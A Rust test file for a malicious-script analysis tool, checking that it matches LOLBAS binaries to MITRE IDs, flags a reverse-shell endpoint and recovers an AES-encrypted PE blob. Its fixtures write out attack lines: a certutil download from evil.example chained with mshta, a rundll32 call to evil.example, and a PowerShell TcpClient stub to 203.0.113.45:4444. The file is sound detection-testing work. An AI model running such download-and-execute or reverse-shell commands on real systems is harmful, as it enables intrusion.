fn summarize_lolbas_enrichment_matches_program_path_after_command_separator() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\payload.bin & C:\\Windows\\System32\\mshta.exe http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
}

#[test]
fn analyze_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "rundll32 url.dll,FileProtocolHandler http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Rundll32.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.011"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("harrington")
        .expect("bin")
        .args([
            "analyze",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Rundll32.exe")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.011")
    );
}

#[test]
fn tldr_surfaces_remote_connect_disguised_extrac32_and_recovered_pe_count() {
    use base64::Engine;
    // Compose a script that hits multiple TLDR-relevant code paths at
    // once: a PS reverse-shell IP+port pair (RemoteConnect via
    // var-socket scanner), then exercise the tldr output.
    let script = r#"#powershell
$ipaddress = '203.0.113.45'
$dport = 4444
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
"#;

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("rev.ps1");
    fs::write(&input, script).expect("write");

    let assert = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["summarize", "--tldr", input.to_str().expect("path")])
        .assert()
        .success();

    let out = String::from_utf8_lossy(&assert.get_output().stdout).to_string();
    assert!(
        out.contains("C2 connect") && out.contains("203.0.113.45:4444"),
        "tldr missing C2 connect for var-pair reverse shell:\n{out}"
    );

    // Also exercise the recovered-PE branch via the same minimal
    // AES-chain fixture from `deob_writes_recovered_pe_blob_and_meta_file`.
    use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;
    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;

    let key: [u8; 32] = *b"01234567890123456789012345678901";
    let iv: [u8; 16] = *b"abcdefghijklmnop";
    let mut pe = vec![0u8; 2048];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3c] = 0x40;
    pe[0x40] = b'P';
    pe[0x41] = b'E';
    pe[0x56] = 0x02;
    for (i, slot) in pe[256..].iter_mut().enumerate() {
        *slot = (i as u8).wrapping_mul(31).wrapping_add(7);
    }
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&pe).expect("gz");
    let gzipped = gz.finish().expect("gz finish");
    let mut ct = vec![0u8; gzipped.len() + 16];
    let ct_len = Aes256CbcEnc::new(&key.into(), &iv.into())
        .encrypt_padded_b2b_mut::<Pkcs7>(&gzipped, &mut ct)
        .expect("encrypt")
        .len();
    ct.truncate(ct_len);
    let ct_b64 = base64::engine::general_purpose::STANDARD.encode(&ct);
    let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
    let iv_b64 = base64::engine::general_purpose::STANDARD.encode(iv);

    let aes_script = format!(
        "@echo off\r\n\
         set \"X=$a.Key=[System.Convert]::FromBase64String('{key_b64}');\
         $a.IV=[System.Convert]::FromBase64String('{iv_b64}');\"\r\n\
         :: {ct_b64}\r\n"
    );
    let aes_input = dir.path().join("aes.bat");
    fs::write(&aes_input, &aes_script).expect("write aes");
    let aes_assert = Command::cargo_bin("harrington")
        .expect("bin")
        .args(["summarize", "--tldr", aes_input.to_str().expect("path")])
        .assert()
        .success();
    let aes_out = String::from_utf8_lossy(&aes_assert.get_output().stdout).to_string();
    assert!(
        aes_out.contains("Recovered PE blobs:"),
        "tldr missing recovered-PE count:\n{aes_out}"
    );
}
